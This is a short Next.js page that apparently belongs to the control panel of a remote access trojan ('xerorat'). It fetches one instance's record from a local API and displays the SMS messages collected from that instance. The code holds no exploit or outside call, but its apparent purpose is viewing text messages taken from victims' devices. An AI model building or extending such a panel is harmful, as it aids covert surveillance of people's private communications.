'use client'
import React, { useEffect, useState } from 'react';
import { Prism as SyntaxHighlighter } from 'react-syntax-highlighter';
import { atomDark } from 'react-syntax-highlighter/dist/esm/styles/prism';
import SMSCards from '@/components/SMSCard';
import { useRouter } from 'next/navigation';

const Page = ({ params }) => {
    const [data, setData] = useState(null); // Initialize data as null

    useEffect(() => {
        const getData = async () => {
            try {
                const requestData = {
                    instance_id: params.userid,
                    user_id: localStorage.getItem('xerorat_user_id'), // Add user_id from localStorage
                };

                console.log(requestData);

                const timestamp = Date.now();
                const response = await fetch(`/api/getDataOne?timestamp=${timestamp}`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(requestData),
                });

                if (!response.ok) {
                    throw new Error(`API request failed with status ${response.status}`);
                }

                const responseData = await response.json();

                // Update state with the response data
                setData(responseData.oneRatModel);
            } catch (error) {
                // Handle errors gracefully and provide more informative messages
                setData(`An error occurred: ${error.message}`);
            }
        };

        getData();
    }, [params.userid]);

    return (
        <div className="text-white">
            <div>User ID: {params.userid}</div>
            {data !== null ? (
                <div>
                    <h2>Data:</h2>
                    <SMSCards data={data.formData.messages} />
                </div>
            ) : (
                <div>Loading...</div>
            )}
        </div>
    );
};

export default Page;
